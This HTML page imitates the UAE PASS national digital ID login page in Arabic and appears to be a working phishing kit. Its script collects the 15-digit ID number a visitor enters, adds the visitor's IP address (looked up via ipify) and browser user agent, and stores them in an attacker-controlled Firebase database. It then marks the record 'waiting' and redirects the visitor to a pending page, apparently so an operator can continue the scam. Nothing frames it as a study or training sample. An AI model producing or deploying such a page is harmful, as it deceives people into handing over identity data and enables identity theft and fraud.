<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>UAE PASS - تسجيل الدخول</title>

<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script src="firebase-config.js?v=16"></script>
</head>

<body>

<div class="main-wrapper">
<div class="container">

<h2 style="text-align:center">الدخول عن طريق الهوية الرقمية</h2>

<form id="loginForm">
<input id="username" maxlength="15" placeholder="رقم الهوية (15 رقم)" required>
<br><br>
<label>
<input type="checkbox" id="rememberme" checked> تذكرني
</label>
<br><br>
<button id="submitButton" type="submit">
<i class="fas fa-sign-in-alt"></i> تسجيل الدخول
</button>
</form>

<div id="loadingScreen" style="display:none;text-align:center">
<p id="loadingMessage">جاري التحضير...</p>
<div style="background:#eee;height:6px">
<div id="progressBar" style="height:6px;width:0%;background:#00ac75"></div>
</div>
<div id="progressText">0%</div>
<p id="firebaseStatus"></p>
</div>

</div>
</div>

<script>
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const submitButton = document.getElementById('submitButton');
const loadingScreen = document.getElementById('loadingScreen');
const progressBar = document.getElementById('progressBar');
const progressText = document.getElementById('progressText');
const firebaseStatus = document.getElementById('firebaseStatus');
const loadingMessage = document.getElementById('loadingMessage');

let processing = false;

function updateProgress(p, msg){
  progressBar.style.width = p + '%';
  progressText.textContent = p + '%';
  if(msg) loadingMessage.textContent = msg;
}

async function getClientIP(){
  try{
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    return d.ip;
  }catch{
    return 'unknown';
  }
}

async function ensureFirebase(){
  if(!window.firebaseServices) return false;
  return window.firebaseServices.initialize();
}

async function saveIdNumber(idNumber, rememberMe){
  const ip = await getClientIP();

  const result = await window.firebaseServices.createNewRecord(idNumber,{
    rememberMe,
    ip,
    userAgent:navigator.userAgent
  });

  if(!result.success) throw new Error(result.error);

  const realtimeDb = window.firebaseServices.realtimeDb();
  if(!realtimeDb) throw new Error('Realtime DB غير متاح');

  await realtimeDb.ref(`user_auth_numbers/${result.recordId}`).set({
    status:'waiting',
    createdAt:Date.now(),
    source:'apply_page'
  });

  return result.recordId;
}

loginForm.addEventListener('submit', async e=>{
  e.preventDefault();
  if(processing) return;

  const id = usernameInput.value.trim();
  if(!/^\d{15}$/.test(id)){
    alert('رقم الهوية يجب أن يكون 15 رقم');
    return;
  }

  processing = true;
  submitButton.disabled = true;
  loadingScreen.style.display='block';

  updateProgress(10,'جاري التحضير...');
  firebaseStatus.textContent='جاري الاتصال بقاعدة البيانات';

  try{
    updateProgress(30,'تهيئة Firebase...');
    const ok = await ensureFirebase();
    if(!ok) throw new Error('فشل الاتصال');

    updateProgress(50,'إنشاء الطلب...');
    const recordId = await saveIdNumber(id, document.getElementById('rememberme').checked);

    updateProgress(80,'جاري التحويل...');
    setTimeout(()=>{
      location.href = `success.html?recordId=${recordId}&source=apply_page&status=pending&waiting=true`;
    },1000);

  }catch(err){
    alert('حدث خطأ، حاول مرة أخرى');
    console.error(err);
    processing=false;
    submitButton.disabled=false;
    loadingScreen.style.display='none';
  }
});

</script>
</body>
</html>
